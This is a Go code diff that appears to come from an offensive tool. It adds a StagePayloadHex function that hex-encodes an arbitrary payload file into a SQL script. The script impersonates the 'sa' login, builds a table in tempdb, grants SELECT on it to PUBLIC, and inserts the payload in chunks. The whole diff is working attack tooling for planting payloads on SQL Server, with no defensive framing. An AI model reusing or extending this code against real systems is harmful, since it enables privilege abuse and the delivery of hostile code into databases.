@@ -5,6 +5,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"strings"
@@ -68,4 +69,30 @@ func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err er
 		return "", fmt.Errorf("write sql: %w", err)
 	}
 	return key, nil
+}
+
+// StagePayloadHex reads the payload, hex-encodes it (no encryption), and writes
+// a SQL script to outPath that INSERTs 8000-char hex chunks into tempdb..stg.
+func StagePayloadHex(payloadPath, outPath string) error {
+	data, err := os.ReadFile(payloadPath)
+	if err != nil {
+		return fmt.Errorf("read payload: %w", err)
+	}
+
+	hexStr := strings.ToUpper(hex.EncodeToString(data))
+
+	var sb strings.Builder
+	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
+	sb.WriteString("USE tempdb;\n")
+	sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
+	sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
+	sb.WriteString("GRANT SELECT ON stg TO PUBLIC;\n")
+	for i := 0; i < len(hexStr); i += chunkSize {
+		end := i + chunkSize
+		if end > len(hexStr) {
+			end = len(hexStr)
+		}
+		fmt.Fprintf(&sb, "INSERT INTO stg(chunk) VALUES (N'%s');\n", hexStr[i:end])
+	}
+	return os.WriteFile(outPath, []byte(sb.String()), 0600)
 }
